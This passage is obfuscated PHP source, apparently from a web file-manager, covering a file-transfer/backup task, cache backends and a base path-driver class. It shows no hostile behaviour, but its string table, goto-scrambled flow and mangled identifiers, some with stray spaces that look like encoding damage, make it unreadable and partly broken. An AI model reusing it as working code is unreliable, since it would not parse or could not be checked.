TaskFileTransfer($_SERVER[í¤âËÚ£¶íÊ¢][745], $_SERVER[í¤âËÚ£¶íÊ¢][718], $eÜöÛ±µ, LNG($_SERVER[í¤âËÚ£¶íÊ¢][719]) . $_SERVER[í¤âËÚ£¶íÊ¢][720] . LNG($_SERVER[í¤âËÚ£¶íÊ¢][746])); goto a¬À“Ê§œí; DŸ§½ØÜÚ£: $aéÑ¢¡©Ê = array($_SERVER[í¤âËÚ£¶íÊ¢][758] => 1, $_SERVER[í¤âËÚ£¶íÊ¢][479] => time(), $_SERVER[í¤âËÚ£¶íÊ¢][713] => 1, $_SERVER[í¤âËÚ£¶íÊ¢][755] => $B£³©‹êÈ¾, $_SERVER[í¤âËÚ£¶íÊ¢][748] => $aö¶ËÉëƒ», $_SERVER[í¤âËÚ£¶íÊ¢][747] => $eÜöÛ±µ); if ($d—›ìÛ¶Ç) { $aéÑ¢¡©Ê[$_SERVER[í¤âËÚ£¶íÊ¢][756]] = $A¢öƒæÃÛ¸; $aéÑ¢¡©Ê[$_SERVER[í¤âËÚ£¶íÊ¢][757]] = $A‡Û¯Ä§Ÿ—; } Backup::set($aéÑ¢¡©Ê); goto F’Ôò†æ‘; a¬À“Ê§œí: $F…½¿¡»Ó->task[$_SERVER[í¤âËÚ£¶íÊ¢][703]] = $aö¶ËÉëƒ»; $aéÑ¢¡©Ê = array($_SERVER[í¤âËÚ£¶íÊ¢][747] => $eÜöÛ±µ, $_SERVER[í¤âËÚ£¶íÊ¢][748] => $aö¶ËÉëƒ»); Backup::set($aéÑ¢¡©Ê); goto d³åÏè‘ÃÓ; E„½ÖÜñÓè: $a’ºÙàñÜ½ = Backup::get(); $B£³©‹êÈ¾ = $a’ºÙàñÜ½[$_SERVER[í¤âËÚ£¶íÊ¢][298]][$_SERVER[í¤âËÚ£¶íÊ¢][201]][$_SERVER[í¤âËÚ£¶íÊ¢][450]]; $D¼™®êÚ‚ = array($_SERVER[í¤âËÚ£¶íÊ¢][451] => array($_SERVER[í¤âËÚ£¶íÊ¢][743], $B£³©‹êÈ¾), $_SERVER[í¤âËÚ£¶íÊ¢][744] => array($_SERVER[í¤âËÚ£¶íÊ¢][336], $a’ºÙàñÜ½[$_SERVER[í¤âËÚ£¶íÊ¢][696]])); goto dÚˆˆ‹¤ñš; BâÄÒñ«óà: $EØÁÕ¨Æ®á = 1000; $fì¤™·²âÜ = $d—›ìÛ¶Ç = 0; $Dš’Ñã¥ = array(); goto CÇÚÃ‰İ²; d³åÏè‘ÃÓ: $FğŠÜÆÆñ = !0; $Fáœ‚¦èÃ• = $this->storeIds(); $aÚç®Ì²Úª = 1; goto BâÄÒñ«óà; CÇÚÃ‰İ²: $A‡Û¯Ä§Ÿ— = $A¢öƒæÃÛ¸ = 0; do { $CÚ¹ØÉ…Äµ = $_SERVER[í¤âËÚ£¶íÊ¢][749]; $CĞ°¾ÀÄß· = Model($_SERVER[í¤âËÚ£¶íÊ¢][723])->where($D¼™®êÚ‚)->field($CÚ¹ØÉ…Äµ)->order($_SERVER[í¤âËÚ£¶íÊ¢][750])->selectPage($EØÁÕ¨Æ®á, $aÚç®Ì²Úª); $BÛá›ñ‚„ = !empty($CĞ°¾ÀÄß·[$_SERVER[í¤âËÚ£¶íÊ¢][375]]) ? $CĞ°¾ÀÄß·[$_SERVER[í¤âËÚ£¶íÊ¢][375]] : array(); foreach ($BÛá›ñ‚„ as $DîÄÆøÉğÇ) { goto A²õ©âœ½´; A²õ©âœ½´: if (!$this->_fileExist($DîÄÆøÉğÇ, $Dš’Ñã¥, $Fáœ‚¦èÃ•)) { $eÜöÛ±µ -= 1; $aö¶ËÉëƒ» -= (int) $DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][87]]; write_log("\x66\x69\154\145\40\156\157\164\40\x65\170\x69\163\x74\56\146\x69\154\145\111\x44\x3a{$DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][450]]}\54\x20\160\141\164\x68\72{$DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][85]]}", $_SERVER[í¤âËÚ£¶íÊ¢][751]); continue; } $aØæ™éíò = $DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][85]]; $a¦ÍÓâºË– = "\173\x69\157\x3a{$a’ºÙàñÜ½[$_SERVER[í¤âËÚ£¶íÊ¢][696]]}\x7d" . substr($aØæ™éíò, strlen("\173\151\157\72{$DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][752]]}\175")); goto F¡³å¾¦…; C’˜–ïÁ‚¶: $fì¤™·²âÜ += $DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][87]]; $A¢öƒæÃÛ¸ += 1; $A‡Û¯Ä§Ÿ— += $DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][87]]; goto d²œÄÃ©ğÈ; F¡³å¾¦…: if (IO::exist($a¦ÍÓâºË–)) { $F…½¿¡»Ó->updateFileEnd($DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][28]], $DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][87]]); } else { $a¦ÍÓâºË– = get_path_father($a¦ÍÓâºË–); IO::mkdir($a¦ÍÓâºË–); if (!IO::copy($aØæ™éíò, $a¦ÍÓâºË–, $_SERVER[í¤âËÚ£¶íÊ¢][753])) { write_log($_SERVER[í¤âËÚ£¶íÊ¢][754] . $aØæ™éíò . $_SERVER[í¤âËÚ£¶íÊ¢][739] . $a¦ÍÓâºË– . $_SERVER[í¤âËÚ£¶íÊ¢][508], $_SERVER[í¤âËÚ£¶íÊ¢][718]); $FğŠÜÆÆñ = !1; break; } } $B£³©‹êÈ¾ = $DîÄÆøÉğÇ[$_SERVER[í¤âËÚ£¶íÊ¢][450]]; $d—›ìÛ¶Ç += 1; goto C’˜–ïÁ‚¶; d²œÄÃ©ğÈ: if ($fì¤™·²âÜ >= 1024 * 1024 * 100) { $aéÑ¢¡©Ê = array($_SERVER[í¤âËÚ£¶íÊ¢][755] => $B£³©‹êÈ¾, $_SERVER[í¤âËÚ£¶íÊ¢][756] => $A¢öƒæÃÛ¸, $_SERVER[í¤âËÚ£¶íÊ¢][757] => $A‡Û¯Ä§Ÿ—); Backup::set($aéÑ¢¡©Ê); $fì¤™·²âÜ = $d—›ìÛ¶Ç = 0; } goto dçßí§ª¥Æ; dçßí§ª¥Æ: } $aµºêİÛ¬Ö = count($BÛá›ñ‚„); $aÚç®Ì²Úª++; } while ($aµºêİÛ¬Ö == $EØÁÕ¨Æ®á); $F…½¿¡»Ó->end(); goto DŸ§½ØÜÚ£; F’Ôò†æ‘: $this->_fileFilter($Dš’Ñã¥); return !0; goto F²¥Ü½; F²¥Ü½: } private function _fileExist($C·Ê¸—ëº…, &$eÂ¢¤Ÿº†¿, $e±Å“¯™Ã‘) { goto a¢‚çÆø ´; Fàƒ¹†ˆ·‘: if (IO::exist($D…êÀ¥–ŠÕ)) { $eÂ¢¤Ÿº†¿[] = $C·Ê¸—ëº…[$c—‚ööÓŞ[450]]; return !1; } $d´èÎùÅµá = array($c—‚ööÓŞ[752] => $C·Ê¸—ëº…[$c—‚ööÓŞ[752]], $c—‚ööÓŞ[85] => array($c—‚ööÓŞ[387], "{$D…êÀ¥–ŠÕ}\45")); $b³×Øî­“Ô = Model($c—‚ööÓŞ[723])->where($d´èÎùÅµá)->field($c—‚ööÓŞ[451])->select(); goto Eíã‹÷Ì¥À; Eíã‹÷Ì¥À: $eÂ¢¤Ÿº†¿ = array_merge($eÂ¢¤Ÿº†¿, array_to_keyvalue($b³×Øî­“Ô, $c—‚ööÓŞ[33], $c—‚ööÓŞ[450])); return !1; goto CæËç… â»; a¢‚çÆø ´: $c—‚ööÓŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aŒ†ÊÅº = $C·Ê¸—ëº…[$c—‚ööÓŞ[85]]; if (in_array($C·Ê¸—ëº…[$c—‚ööÓŞ[450]], $eÂ¢¤Ÿº†¿)) { return !1; } goto b¹˜î’¿È¬; b¹˜î’¿È¬: if (!in_array($C·Ê¸—ëº…[$c—‚ööÓŞ[752]], $e±Å“¯™Ã‘)) { return !1; } if (IO::exist($aŒ†ÊÅº)) { return !0; } $D…êÀ¥–ŠÕ = get_path_father($aŒ†ÊÅº); goto Fàƒ¹†ˆ·‘; CæËç… â»: } private function _fileFilter($AÉì­¼ø™Ï) { $CçÛŸèæº =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($AÉì­¼ø™Ï)) { return; } $F•¿³Úôå“ = array($CçÛŸèæº[450] => array($CçÛŸèæº[7], array_unique($AÉì­¼ø™Ï))); $aë¾ªÜš„ = Model($CçÛŸèæº[759])->where($F•¿³Úôå“)->field($CçÛŸèæº[399])->select(); foreach ($aë¾ªÜš„ as $A—Ã²Ë“à‚) { Model($CçÛŸèæº[759])->remove($A—Ã²Ë“à‚[$CçÛŸèæº[399]], !1); } } private function storeIds() { $DÊ®ãÕÒã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aº­æ»³ª  = Model($DÊ®ãÕÒã[708])->listData(); $Dğ’¾ö¤¤ = array(); $CÔ¯ÈîªÈ = $GLOBALS[$DÊ®ãÕÒã[6]][$DÊ®ãÕÒã[97]][$DÊ®ãÕÒã[760]]; foreach ($aº­æ»³ª  as $DæÈ’¥) { $eš’œ¦Ø°· = strtolower($DæÈ’¥[$DÊ®ãÕÒã[103]]); if (!isset($CÔ¯ÈîªÈ[$eš’œ¦Ø°·])) { continue; } $D»­ÜÆÚæĞ = $DÊ®ãÕÒã[81] . (isset($CÔ¯ÈîªÈ[$eš’œ¦Ø°·]) ? $CÔ¯ÈîªÈ[$eš’œ¦Ø°·] : ucfirst($eš’œ¦Ø°·)); if (!class_exists($D»­ÜÆÚæĞ)) { continue; } $Dğ’¾ö¤¤[] = $DæÈ’¥[$DÊ®ãÕÒã[397]]; } return $Dğ’¾ö¤¤; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto DîƒÑìØ†®; DîƒÑìØ†®: $Eøù–Ú·²Ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto b¼ë‡’Çå; EÁ­Â·¿í: switch ($D¦Ş¹“ Ïğ[$Eøù–Ú·²Ù[761]]) { case $Eøù–Ú·²Ù[17]: self::$handle = Model($Eøù–Ú·²Ù[763]); break; case $Eøù–Ú·²Ù[764]: self::$handle = new CacheRedis($EÓôÆ«¥, $b¾ÊÙ¬Ùœ); break; case $Eøù–Ú·²Ù[765]: self::$handle = new CacheMemcached($EÓôÆ«¥, $b¾ÊÙ¬Ùœ); break; case $Eøù–Ú·²Ù[201]: self::$handle = new CacheFile($EÓôÆ«¥, $b¾ÊÙ¬Ùœ); break; default: break; } return self::$handle; goto b³Åë¤†ˆµ; b¼ë‡’Çå: $D¦Ş¹“ Ïğ = $GLOBALS[$Eøù–Ú·²Ù[6]][$Eøù–Ú·²Ù[354]]; $EÓôÆ«¥ = $D¦Ş¹“ Ïğ[$D¦Ş¹“ Ïğ[$Eøù–Ú·²Ù[761]]]; $b¾ÊÙ¬Ùœ = $D¦Ş¹“ Ïğ[$Eøù–Ú·²Ù[762]]; goto EÁ­Â·¿í; b³Åë¤†ˆµ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($EÌ¾êŸ‹øƒ) { if (is_array($EÌ¾êŸ‹øƒ) || is_object($EÌ¾êŸ‹øƒ)) { $EÌ¾êŸ‹øƒ = json_encode($EÌ¾êŸ‹øƒ); } $EÌ¾êŸ‹øƒ = rawurlencode($EÌ¾êŸ‹øƒ); return md5(KOD_SITE_ID . $_SERVER[í¤âËÚ£¶íÊ¢][80] . $EÌ¾êŸ‹øƒ); } public static function get($eŸÎá¾ìÖÛ, $BÊÄ¢‘½Ú = false) { $B—…Ï ®Ï• = self::key($eŸÎá¾ìÖÛ); if ($BÊÄ¢‘½Ú) { return unserialize(self::init()->get($B—…Ï ®Ï•)); } if (!isset(self::$memoryCache[$B—…Ï ®Ï•])) { $dØŒªåÍæ = self::init()->get($B—…Ï ®Ï•); self::$memoryCache[$B—…Ï ®Ï•] = unserialize($dØŒªåÍæ); } return self::$memoryCache[$B—…Ï ®Ï•]; } public static function set($Dá–ŒñÃã…, $Cö×ÜÁ©•, $aÔ¼ª¶ª’  = false) { goto cÉŸ¼ôÑ“¨; Eã†´×õô‚: CacheLock::lock($Dá–ŒñÃã…); $fí“Ò•ë½œ = self::init()->set($dÅæ£·‹â, serialize($Cö×ÜÁ©•), $aÔ¼ª¶ª’ ); self::$memoryCache[$dÅæ£·‹â] = $Cö×ÜÁ©•; goto AôÀßŞÌ½—; cÉŸ¼ôÑ“¨: $dÅæ£·‹â = self::key($Dá–ŒñÃã…); if (isset(self::$memoryCache[$dÅæ£·‹â]) && self::$memoryCache[$dÅæ£·‹â] === $Cö×ÜÁ©•) { return !0; } if ($aÔ¼ª¶ª’  === 0) { self::$memoryCache[$dÅæ£·‹â] = $Cö×ÜÁ©•; return !0; } goto Eã†´×õô‚; AôÀßŞÌ½—: CacheLock::unlock($Dá–ŒñÃã…); return $fí“Ò•ë½œ; goto bØ…”‘ñÓô; bØ…”‘ñÓô: } public static function getCall($E³°ğ’…àË, $cÎ¤ñŸ‡å, $DÄÔ¢ÊÛİ›, $bõìõ¯Ì“¢ = array()) { $a¬æĞÇµ¥‰ = self::get($E³°ğ’…àË); if ($a¬æĞÇµ¥‰) { return $a¬æĞÇµ¥‰; } $a¬æĞÇµ¥‰ = call_user_func_array($DÄÔ¢ÊÛİ›, $bõìõ¯Ì“¢); self::set($E³°ğ’…àË, $a¬æĞÇµ¥‰, $cÎ¤ñŸ‡å); return $a¬æĞÇµ¥‰; } public static function remove($dˆ¶¬ŞóèÍ) { goto A‰Ü¬Îœ´›; C¼åƒùƒ´³: return $DË«êîì¤; goto FĞíÈ¯–ÙÓ; A‰Ü¬Îœ´›: $Bà·µˆ± = self::key($dˆ¶¬ŞóèÍ); unset(self::$memoryCache[$Bà·µˆ±]); self::clearTimeout(); goto aç¼‰á¢Ü±; aç¼‰á¢Ü±: CacheLock::lock($dˆ¶¬ŞóèÍ); $DË«êîì¤ = self::init()->remove($Bà·µˆ±); CacheLock::unlock($dˆ¶¬ŞóèÍ); goto C¼åƒùƒ´³; FĞíÈ¯–ÙÓ: } public static function removeMemory($c÷¢ä¼‡¼Ó) { $DÌÊÙ†Ğ = self::key($c÷¢ä¼‡¼Ó); unset(self::$memoryCache[$DÌÊÙ†Ğ]); } public static function clearMemory($CÍ¬è‹‚‹ç = false) { if ($CÍ¬è‹‚‹ç) { $CÍ¬è‹‚‹ç = self::key($CÍ¬è‹‚‹ç); unset(self::$memoryCache[$CÍ¬è‹‚‹ç]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[í¤âËÚ£¶íÊ¢][766])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[í¤âËÚ£¶íÊ¢][767])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($d®îåî™Óœ, $E‡·Åİ¥) { $EŒ¼æ‹µ„¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->cachePath = $d®îåî™Óœ[$EŒ¼æ‹µ„¹[85]]; $this->prefix = $EŒ¼æ‹µ„¹[768]; $this->cacheTime = $E‡·Åİ¥; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($fò‘õœ‰å) { $BŒœÜ¤À Æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fò‘õœ‰å = str_replace(array($BŒœÜ¤À Æ[769], $BŒœÜ¤À Æ[106], $BŒœÜ¤À Æ[79]), $BŒœÜ¤À Æ[770], $fò‘õœ‰å); return $this->cachePath . $BŒœÜ¤À Æ[771] . $fò‘õœ‰å . $BŒœÜ¤À Æ[772]; } public function set($C´Í¸Œœå, $Dºóã¸»Ä˜, $få¾ÏÂªè = false) { $E¼óÇéÉŸ‹ = $this->getFile($C´Í¸Œœå); if (file_put_contents($E¼óÇéÉŸ‹, $this->prefix . $Dºóã¸»Ä˜, LOCK_EX)) { return !0; } @unlink($E¼óÇéÉŸ‹); return !1; } public function get($BÛ°†ÛÓÊ­) { $fÒßÄ…ô† = $this->getFile($BÛ°†ÛÓÊ­); if (file_exists($fÒßÄ…ô†) && filemtime($fÒßÄ…ô†) < time() - $this->cacheTime) { @unlink($fÒßÄ…ô†); return !1; } $B‰‡ä‰âç = @file_get_contents($fÒßÄ…ô†); return substr($B‰‡ä‰âç, strlen($this->prefix)); } public function remove($EĞ°æ™³¢) { $f·ã†Ñ„æ = $this->getFile($EĞ°æ™³¢); return @unlink($f·ã†Ñ„æ); } public function deleteAll() { $AìæâˆÃ¨ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eì’½¶Ë¡Ú = scandir($this->cachePath); foreach ($eì’½¶Ë¡Ú as $cè¤†ôåáì) { $BÛñ±ì½æ = $this->cachePath . $cè¤†ôåáì; if (strpos($BÛñ±ì½æ, $AìæâˆÃ¨[772]) && strpos($BÛñ±ì½æ, $AìæâˆÃ¨[773])) { @unlink($BÛñ±ì½æ); } } } public function clearTimeout() { $aÀ¦´¨Ë• =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÄÍøéÑ® = scandir($this->cachePath); foreach ($EÄÍøéÑ® as $b©£Âšè’ë) { $c®­³åÜêø = $this->cachePath . $b©£Âšè’ë; if (strpos($c®­³åÜêø, $aÀ¦´¨Ë•[772]) && strpos($c®­³åÜêø, $aÀ¦´¨Ë•[773]) && filemtime($c®­³åÜêø) < time() - $this->cacheTime) { @unlink($c®­³åÜêø); } } } } goto BéØßŞÒ±½; b®‘ïÛÓ: define($_SERVER[í¤âËÚ£¶íÊ¢][244], 2); define($_SERVER[í¤âËÚ£¶íÊ¢][245], 3); define($_SERVER[í¤âËÚ£¶íÊ¢][246], 1); goto Cñ•‚ÇöÙ; bÅÎÊ–øÔ: define($_SERVER[í¤âËÚ£¶íÊ¢][0], $_SERVER[í¤âËÚ£¶íÊ¢][1]); $_SERVER[Å€ÍÈ¹­Ï•Âœ] = explode($_SERVER[í¤âËÚ£¶íÊ¢][2], gzinflate(substr($_SERVER[í¤âËÚ£¶íÊ¢][3], 10, -8))); function binCheckEq($CÎÂ½»‹¾Ë, $D¿±õ¡¬Åé) { return $CÎÂ½»‹¾Ë == $D¿±õ¡¬Åé; } goto E•±ÚõÇî÷; DôÒãÓÃÏ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $E‘â·Ç   =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->objectDriver = array($E‘â·Ç  [67], $E‘â·Ç  [68], $E‘â·Ç  [69], $E‘â·Ç  [70], $E‘â·Ç  [71], $E‘â·Ç  [72], $E‘â·Ç  [73], $E‘â·Ç  [74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($B‹É÷Æ†ª) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($B‹É÷Æ†ª, $_SERVER[í¤âËÚ£¶íÊ¢][8]); } return $B‹É÷Æ†ª; } public function iconvApp($F…å×±¦Çæ) { return $F…å×±¦Çæ; } public function iconvSystem($d¯¬ˆ¿´Ü) { return $d¯¬ˆ¿´Ü; } public function iconvTo($f¡ƒÜÕˆ°, $Bğ¶õ‰•Á¨, $F‚›²Óƒ…°) { goto b´×Ü†Êêå; EÔË¼œê–¼: $b·ğ‚Şƒ£Õ = $b·ğ‚Şƒ£Õ ? $b·ğ‚Şƒ£Õ : $f¡ƒÜÕˆ°; if (strstr($b·ğ‚Şƒ£Õ, $a“Œ¦É¢æ[79])) { $b·ğ‚Şƒ£Õ = str_replace($a“Œ¦É¢æ[79], $a“Œ¦É¢æ[80], $b·ğ‚Şƒ£Õ); } $F´š ËÙ„È[$Bğ¶õ‰•Á¨ . $a“Œ¦É¢æ[76] . $F‚›²Óƒ…° . $a“Œ¦É¢æ[77] . $f¡ƒÜÕˆ°] = $b·ğ‚Şƒ£Õ; goto cí†ªè¸®®; cí†ªè¸®®: $F´š ËÙ„È[$F‚›²Óƒ…° . $a“Œ¦É¢æ[76] . $Bğ¶õ‰•Á¨ . $a“Œ¦É¢æ[77] . $f¡ƒÜÕˆ°] = $f¡ƒÜÕˆ°; $F´š ËÙ„È[$F‚›²Óƒ…° . $a“Œ¦É¢æ[76] . $Bğ¶õ‰•Á¨ . $a“Œ¦É¢æ[77] . $b·ğ‚Şƒ£Õ] = $f¡ƒÜÕˆ°; $F´š ËÙ„È[$Bğ¶õ‰•Á¨ . $a“Œ¦É¢æ[76] . $F‚›²Óƒ…° . $a“Œ¦É¢æ[77] . $b·ğ‚Şƒ£Õ] = $b·ğ‚Şƒ£Õ; goto cŠÄ„ù—Î‚; b´×Ü†Êêå: $a“Œ¦É¢æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$f¡ƒÜÕˆ° || !function_exists($a“Œ¦É¢æ[75])) { return $f¡ƒÜÕˆ°; } static $F´š ËÙ„È = array(); goto e½ÛÀ‘Ø†™; cŠÄ„ù—Î‚: return $b·ğ‚Şƒ£Õ; goto fÁ¬ŠÔÛƒô; e½ÛÀ‘Ø†™: $f›¬ˆ…Ô®á = $Bğ¶õ‰•Á¨ . $a“Œ¦É¢æ[76] . $F‚›²Óƒ…° . $a“Œ¦É¢æ[77] . $f¡ƒÜÕˆ°; if (isset($F´š ËÙ„È[$f›¬ˆ…Ô®á])) { return $F´š ËÙ„È[$f›¬ˆ…Ô®á]; } if (function_exists($a“Œ¦É¢æ[78])) { $b·ğ‚Şƒ£Õ = @mb_convert_encoding($f¡ƒÜÕˆ°, $F‚›²Óƒ…°, $Bğ¶õ‰•Á¨); } else { $b·ğ‚Şƒ£Õ = @iconv($Bğ¶õ‰•Á¨, $F‚›²Óƒ…°, $f¡ƒÜÕˆ°); } goto EÔË¼œê–¼; fÁ¬ŠÔÛƒô: } public function getPathInner($B™¼‡•ğ×) { $aË÷ÔÔø·ƒ = IO::init($B™¼‡•ğ×); return $aË÷ÔÔø·ƒ->path; } public function getPathOuter($B¯³…İ¸ÊÖ) { $E‘îë‹Š²ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÚàœÒ“Ô = strlen(trim($this->pathBase, $E‘îë‹Š²ù[8])); $B¯³…İ¸ÊÖ = substr(trim($B¯³…İ¸ÊÖ, $E‘îë‹Š²ù[8]), $AÚàœÒ“Ô); return $this->pathDriver . $E‘îë‹Š²ù[8] . ltrim($B¯³…İ¸ÊÖ, $E‘îë‹Š²ù[8]); } public function isParentOf($Fø¿¶– ‹ã, $bèÈîï…Åé) { $fÓˆÁÃ–‘í =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Fø¿¶– ‹ã = rtrim(strtolower($Fø¿¶– ‹ã), $fÓˆÁÃ–‘í[8]) . $fÓˆÁÃ–‘í[8]; $bèÈîï…Åé = rtrim(strtolower($bèÈîï…Åé), $fÓˆÁÃ–‘í[8]) . $fÓˆÁÃ–‘í[8]; $DÓ“ƒùĞ¯‹ = strpos($bèÈîï…Åé, $Fø¿¶– ‹ã) === 0; return $DÓ“ƒùĞ¯‹; } public function getType() { $eŸŠ½ª¦Ãñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÙïÎšË¿ä = str_replace($eŸŠ½ª¦Ãñ[81], $eŸŠ½ª¦Ãñ[33], get_class($this)); return strtolower($cÙïÎšË¿ä); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($CË”ëåÚñ, $e©¡ˆ¾ê³) { $b†Â’Û Ş =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c½š‹º¶“ë = rtrim($CË”ëåÚñ, $b†Â’Û Ş[8]) . $b†Â’Û Ş[8] . $e©¡ˆ¾ê³; $A÷»ÊšêÎš = $this->exist($c½š‹º¶“ë); return $A÷»ÊšêÎš ? $c½š‹º¶“ë : !1; } public function setModifyTime($C½í‚£İ‚, $bì‡ˆã‹¯© = '') { } public function renameObject($FÀÖ„®’ë°, $Eî±™¿¼ÙÒ) { goto AËĞìòòäï; AËĞìòòäï: $cïÀÉ»’œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b„Å–¹ò½Ó = $Eî±™¿¼ÙÒ; Hook::trigger($cïÀÉ»’œ[82], $this, $FÀÖ„®’ë°, $this, $this->pathFather($FÀÖ„®’ë°) . $Eî±™¿¼ÙÒ); goto cïÑÃÇ“Å; cïÑÃÇ“Å: $FÀÖ„®’ë° = $this->getPathOuter($FÀÖ„®’ë°); $Eî±™¿¼ÙÒ = $this->pathFather($FÀÖ„®’ë°) . $Eî±™¿¼ÙÒ; if (IO::isFile($FÀÖ„®’ë°)) { $c’Õ»ˆ¿° = IO::copy($FÀÖ„®’ë°, $this->pathFather($FÀÖ„®’ë°), REPEAT_RENAME_FOLDER, $b„Å–¹ò½Ó); if ($c’Õ»ˆ¿°) { IO::remove($FÀÖ„®’ë°); } } else { $c’Õ»ˆ¿° = IO::mkdir($Eî±™¿¼ÙÒ); if (!$c’Õ»ˆ¿°) { return !1; } $b»ŠÏ†‘‘ = IO::listPath($FÀÖ„®’ë°, !0); $F«»·ğ–ï = array_merge($b»ŠÏ†‘‘[$cïÀÉ»’œ[83]], $b»ŠÏ†‘‘[$cïÀÉ»’œ[84]]); foreach ($F«»·ğ–ï as $DĞí‡Ôñºƒ) { IO::move($DĞí‡Ôñºƒ[$cïÀÉ»’œ[85]], $Eî±™¿¼ÙÒ, REPEAT_RENAME_FOLDER); } IO::remove($FÀÖ„®’ë°); } goto dµöĞÇµŒÕ; dµöĞÇµŒÕ: return $c’Õ»ˆ¿° ? $Eî±™¿¼ÙÒ : !1; goto d•—“Áç«õ; d•—“Áç«õ: } public function tempFile($c³‹Ó¸¾â… = '', $Bù¿‚§›à = '') { goto aß¿¿‹Ø¥ñ; aÁá½£Œ”³: $a±±’» Òï = $E´”‚²ˆè . $c³‹Ó¸¾â…; @touch($a±±’» Òï); if ($Bù¿‚§›à) { file_put_contents($a±±’» Òï, $Bù¿‚§›à); } goto EÈ‹…ÂÅ¤á; aß¿¿‹Ø¥ñ: if (!$c³‹Ó¸¾â…) { $c³‹Ó¸¾â… = rand_string(15); } $E´”‚²ˆè = TEMP_FILES . rand_string(15) . $_SERVER[í¤âËÚ£¶íÊ¢][8]; @mkdir($E´”‚²ˆè, 511, !0); goto aÁá½£Œ”³; EÈ‹…ÂÅ¤á: return $a±±’» Òï; goto fŠöˆãª»; fŠöˆãª»: } public function tempFileRemve($eµá¬ëšÖã) { @unlink($eµá¬ëšÖã); @rmdir($this->pathFather($eµá¬ëšÖã)); } public function mkfile($DÂ¢…¹‘Áö, $Aİå‘”—¤Ÿ = '', $E‡àŠ¾“íğ = REPEAT_RENAME) { } public function mkdir($F³ÆµåÓ™ï, $A½šëœªï = REPEAT_SKIP) { } public function delFile($D˜Û»¦´”Æ) { } public function delFolder($Cº†À¢×çÇ) { } public function copyFile($DÚ¾ğµÜøº, $bËé¨¼÷Š) { } public function moveFile($E¬ÒëÎÔÌ, $B‹Ğ©«Şñ–) { } public function remove($F‚Ù»¼†—) { if ($this->isFile($F‚Ù»¼†—)) { return $this->delFile($F‚Ù»¼†—); } return $this->delFolder($F‚Ù»¼†—); } public function rename($Fİ¹½››– , $b—øòæâ‚£) { } public function exist($eè×…Îï¶¡) { } public function findByHash($eˆÊ¼ò¼ó = '', $dÎÕšæßŞ = '') { return !1; } public function isFile($d‹ÙÆÎ¨ì†) { } public function isFolder($F¨ÃùÅö£·) { } public function size($fÌ˜¤˜­«…) { } public function info($a°Ú¤×Š…) { } public function infoSimple($FĞã²‰‚º) { return $this->info($FĞã²‰‚º); } public function infoAuth($A™…‰ĞôŞ­) { return $this->info($A™…‰ĞôŞ­); } public function infoFull($e„ æ¹øÊ) { return $this->info($e„ æ¹øÊ); } public function infoWithChildren($E×áµõ¥öÇ) { $bÂÏ‚éŒä =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $böŠÀîæ‘ = array(); if (isset($böŠÀîæ‘[$E×áµõ¥öÇ])) { return $böŠÀîæ‘[$E×áµõ¥öÇ]; } $EÄõ¹³È—× = $this->info($E×áµõ¥öÇ); if ($EÄõ¹³È—× && $EÄõ¹³È—×[$bÂÏ‚éŒä[29]] == $bÂÏ‚éŒä[86]) { $BØêØç§Ñ = array($bÂÏ‚éŒä[87] => 0, $bÂÏ‚éŒä[88] => 0, $bÂÏ‚éŒä[89] => 0); $this->infoChildren($E×áµõ¥öÇ, $BØêØç§Ñ); $EÄõ¹³È—×[$bÂÏ‚éŒä[87]] = $BØêØç§Ñ[$bÂÏ‚éŒä[87]]; $EÄõ¹³È—×[$bÂÏ‚éŒä[90]] = array($bÂÏ‚éŒä[91] => $BØêØç§Ñ[$bÂÏ‚éŒä[88]], $bÂÏ‚éŒä[92] => $BØêØç§Ñ[$bÂÏ‚éŒä[89]]); $böŠÀîæ‘[$E×áµõ¥öÇ] = $EÄõ¹³È—×; } return $EÄõ¹³È—×; } public function listPath($f“áªÂÏ, $eæÆé¿Ò¡ = false) { } public function has($B¶ë¥“Á›Š, $bƒ±¤†ºè… = false, $b™Øìõø = false) { } public function canRead($aÅå‹ Óà½) { } public function canWrite($C¥Äö­É‹È) { } public function getContent($E¹ÇÃƒ£) { } public function setContent($B½ù­àï›, $B¨¶ÄÏ¤³è = '') { } protected function 